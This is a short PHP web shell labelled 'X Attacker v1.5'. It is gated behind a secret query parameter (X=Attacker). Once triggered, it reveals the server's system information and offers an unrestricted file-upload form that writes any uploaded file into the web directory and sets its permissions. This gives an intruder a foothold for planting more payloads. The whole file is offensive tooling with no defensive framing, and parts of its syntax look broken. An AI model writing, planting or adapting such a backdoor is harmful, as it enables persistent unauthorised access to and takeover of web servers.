<html>
<!-- X Attacker v1.5 -->
</html>
<?php
${'t'}="<center><b>Uname:".php_uname()."<br></b>";
${'y'}='<font color="black" size="4">';
${'s'}=" <a href=$userfile_name><center><b>Sucess Upload :D ==> $userfile_name</b></center></a>";
${'o'}='<form method="POST" action="#" enctype="multipart/form-data"><input type="file" name="image"><br><input type="Submit" name="Submit" value="Upload"></form>';
${'n'}='</center></font>'
error_reporting(0);
set_time_limit(0);
echo <<< p
p;
if($_GET['X']=="Attacker"){echo {$t}."\r\n".{$y}; if(isset($_POST['Submit'])){$filedir=""; $maxfile='2000000';$mode='0644';$userfile_name=$_FILES['image']['name'];$userfile_tmp=$_FILES['image']['tmp_name'];if(isset($_FILES['image']['name'])){$qx=$filedir.$userfile_name;@move_uploaded_file($userfile_tmp,$qx);@chmod($qx,octdec($mode));echo {$s};}}else{echo {$o};}echo {$n};}?>
